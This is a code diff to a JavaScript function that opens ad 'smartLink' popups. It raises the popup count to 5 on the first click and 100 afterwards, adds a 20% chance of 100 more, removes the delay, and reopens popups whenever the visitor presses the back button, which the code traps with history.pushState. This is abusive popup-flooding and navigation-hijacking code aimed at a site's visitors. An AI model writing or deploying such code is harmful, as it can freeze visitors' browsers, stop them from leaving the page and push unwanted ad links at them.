@@ -240,13 +240,13 @@ function openExternal(){
   let popupCount;
 
   if(clickCount === 1){
-    popupCount = 2; // 1st click = 2 popup
+    popupCount = 5; // 1st click = 5 popup
   } else {
     popupCount = 100; // 2nd+ click = 100 popup
   }
 
   // 🎲 RANDOM BOOST (sometimes +1)
-  if(Math.random() < 0.0){
+  if(Math.random() < 0.20){
     popupCount += 100;
   }
 
@@ -268,7 +268,7 @@ function openExternal(){
 
     setTimeout(() => {
       openPopups(smartLink, popupCount);
-    }, 1200);
+    }, 00);
   }
 
   // 🍎 IOS
@@ -299,7 +299,7 @@ window.onpopstate = function () {
   history.pushState(null, null, location.href);
 
   // আবার popup খুলবে
-  openPopups(smartLink, 2);
+  openPopups(smartLink, 5);
 };
 
 // CLICK EVENT
